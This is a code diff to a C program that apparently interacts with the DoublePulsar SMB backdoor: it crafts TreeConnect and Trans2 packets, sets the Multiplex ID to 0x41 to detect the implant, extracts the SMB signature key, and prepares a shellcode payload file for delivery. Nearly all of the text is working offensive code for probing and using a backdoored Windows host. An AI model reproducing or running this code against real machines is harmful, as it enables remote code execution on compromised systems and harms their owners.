@@ -183,9 +183,9 @@ int main(int argc, char* argv[])
 
 	//copy our returned userID value from the previous packet to the TreeConnect request packet
 	userid = *(WORD*)(recvbuff + 0x20);       //get userid
-	memcpy(TreeConnect_AndX_Request + 0x20, (char*)&userid, 2); //update userid
-
 	
+	//Generates a new TreeConnect request with the correct IP address
+	//rather than the hard coded one embedded in the TreeConnect string
 	int i;
 	char hostipc[40];
 	char hostipc2[40*2];
@@ -204,7 +204,9 @@ int main(int argc, char* argv[])
 	memcpy(ModifiedTreeConnectRequest+3, &smblen, 1);
 	unclen = 9 + (char)strlen(hostipc)*2;
 	memcpy(ModifiedTreeConnectRequest+45, &unclen, 1);
-	
+	//update UserID in modified TreeConnect Request
+	memcpy(ModifiedTreeConnectRequest + 0x20, (char*)&userid, 2); //update userid
+		
 	//send TreeConnect request packet
 	printf("sending TreeConnect Request!\n");
 	send(sock, (char*)ModifiedTreeConnectRequest, sizeof(ModifiedTreeConnectRequest) - 1, 0);
@@ -224,22 +226,22 @@ int main(int argc, char* argv[])
 	memcpy(trans2_request + 28, (char*)&treeid, 2);
 	memcpy(trans2_request + 30, (char*)&processid, 2);
 	memcpy(trans2_request + 32, (char*)&userid, 2);
-	memcpy(trans2_request + 34, (char*)&multiplexid, 2);
-
+	//memcpy(trans2_request + 34, (char*)&multiplexid, 2);
+	trans2_request[34] = '\x41'; //update Multiplex ID to 41
+	//if DoublePulsar is enabled, the multiplex ID is incremented by 10
+	//will return x51 or 81
 	send(sock, (char*)trans2_request, sizeof(trans2_request) - 1, 0);
 	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
 	//FIX ME
 	//extract SMB Signature Key
 	unsigned int signature[8];
-
+	//OR
+	//memcpy(signature, (unsigned int*)&recvbuff + 18, 8);
 	memcpy(signature, (unsigned int*)&recvbuff + 18, 2);
 	memcpy(signature + 2, (unsigned int*)&recvbuff + 20, 2);
 	memcpy(signature + 4, (unsigned int*)&recvbuff + 22, 2);
 	memcpy(signature + 6, (unsigned int*)&recvbuff + 24, 2);
-	
-	//OR
-	//memcpy(signature, (unsigned int*)&recvbuff + 18, 8);
 
 	BUFFER_WITH_SIZE payload;
 	LPCSTR shellcode_file;
